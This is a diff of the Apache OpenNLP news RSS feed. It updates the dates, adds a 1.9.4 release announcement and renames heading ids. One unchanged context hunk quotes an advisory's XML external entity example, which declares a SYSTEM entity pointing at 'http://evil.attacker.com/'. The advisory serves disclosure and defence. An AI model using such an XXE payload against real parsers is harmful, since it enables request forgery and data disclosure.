@@ -24,13 +24,13 @@
     <atom:link href="https://opennlp.apache.org/feed.xml" rel="self" type="application/rss+xml" />
     <description>The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text</description>
     <language>en-us</language>
-    <pubDate>Mon, 7 Jun 2021 19:15:44 +0000</pubDate>
-    <lastBuildDate>Mon, 7 Jun 2021 19:15:44 +0000</lastBuildDate>
+    <pubDate>Tue, 9 Nov 2021 14:27:57 +0000</pubDate>
+    <lastBuildDate>Tue, 9 Nov 2021 14:27:57 +0000</lastBuildDate>
 
     <item>
       <title>OpenNLP Pre-trained Models Available</title>
       <link>https://opennlp.apache.org/news/news-2021-05-30.html</link>
-      <pubDate>Mon, 7 Jun 2021 19:14:36 +0000</pubDate>
+      <pubDate>Tue, 9 Nov 2021 14:27:23 +0000</pubDate>
       <guid isPermaLink="false">news/news-2021-05-30.html</guid>
       	<description>
 	&lt;div class=&quot;sect1&quot;&gt;
@@ -42,6 +42,59 @@ These models were trained on Universal Dependencies and are intended to provide 
 See the models&apos; README for more information on the models including how each was created and evaluated.&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.9.4 released</title>
+      <link>https://opennlp.apache.org/news/release-194.html</link>
+      <pubDate>Wed, 3 Nov 2021 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-194.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of Apache OpenNLP 1.9.4.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Apache OpenNLP 1.9.4 binary and source distributions are available for download from our download page: &lt;a href=&quot;/download.html&quot;&gt;download page&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details: &lt;a href=&quot;/maven-dependency.html&quot;&gt;Maven Dependency&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_9_4&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.4&lt;/h1&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Refactorings to improve code quality and performance.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fix Parser top k parses doesn&amp;#8217;t show &quot;top&quot; (highest probability) parses.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use LinkedHashMap for deterministic iteration order.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fixed spelling errors in the documentation.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;For a complete list of fixed bugs and improvements please see the README.html file included in the distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
 &lt;/div&gt;
 	</description>
     </item>
@@ -70,7 +123,7 @@ See the models&apos; README for more information on the models including how eac
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_9_3&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.3&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_9_3&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.3&lt;/h1&gt;
 &lt;div class=&quot;ulist&quot;&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -129,7 +182,7 @@ See the models&apos; README for more information on the models including how eac
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_9_2&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.2&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_9_2&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.2&lt;/h1&gt;
 &lt;div class=&quot;ulist&quot;&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -182,7 +235,7 @@ See the models&apos; README for more information on the models including how eac
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_9_1&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.1&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_9_1&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.1&lt;/h1&gt;
 &lt;div class=&quot;ulist&quot;&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -253,7 +306,7 @@ See the models&apos; README for more information on the models including how eac
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_9_0&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.0&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_9_0&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.9.0&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces new features, improvements and bug fixes. Java 1.8 and Maven 3.3.9 are required.&lt;/p&gt;
 &lt;/div&gt;
@@ -330,7 +383,7 @@ See the models&apos; README for more information on the models including how eac
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_4&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.4&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_8_4&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.4&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces new features, improvements and bug fixes. Java 1.8 and Maven 3.3.9 are required.&lt;/p&gt;
 &lt;/div&gt;
@@ -437,7 +490,7 @@ The Language Detector Model can detect 103 languages and outputs ISO 639-3 codes
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_3&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.3&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_8_3&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.3&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces new features, improvements and bug fixes. Java 1.8 and Maven 3.3.9 are required.&lt;/p&gt;
 &lt;/div&gt;
@@ -510,7 +563,7 @@ should update to 1.8.2.&lt;/p&gt;
 &lt;/div&gt;
 &lt;div class=&quot;listingblock&quot;&gt;
 &lt;div class=&quot;content&quot;&gt;
-&lt;pre class=&quot;prettyprint highlight&quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
+&lt;pre class=&quot;prettyprint highlight&quot;&gt;&lt;code data-lang=&quot;xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
 &amp;lt;!DOCTYPE r [
 &amp;lt;!ELEMENT r ANY &amp;gt;
 &amp;lt;!ENTITY sp SYSTEM &quot;http://evil.attacker.com/&quot;&amp;gt;
@@ -565,7 +618,7 @@ This issue was discovered by ﻿Nishil Shah of Salesforce.&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_2&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.2&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_8_2&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.2&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces some minor improvements and bug fixes. Java 1.8 is required.&lt;/p&gt;
 &lt;/div&gt;
@@ -621,7 +674,7 @@ This issue was discovered by ﻿Nishil Shah of Salesforce.&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_1&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.1&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_8_1&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.1&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces many new features, improvements and bug fixes. The API has been improved for a better consistency and many deprecated methods were removed. Java 1.8 is required.&lt;/p&gt;
 &lt;/div&gt;
@@ -710,7 +763,7 @@ This issue was discovered by ﻿Nishil Shah of Salesforce.&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_0&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.0&lt;/h1&gt;
+&lt;h1 id=&quot;whats_new_in_apache_opennlp_1_8_0&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.0&lt;/h1&gt;
 &lt;div class=&quot;paragraph&quot;&gt;
 &lt;p&gt;This release introduces many new features, improvements and bug fixes. The API has been improved for a better consistency and many deprecated methods were removed. Java 1.8 is required.&lt;/p&gt;
 &lt;/div&gt;
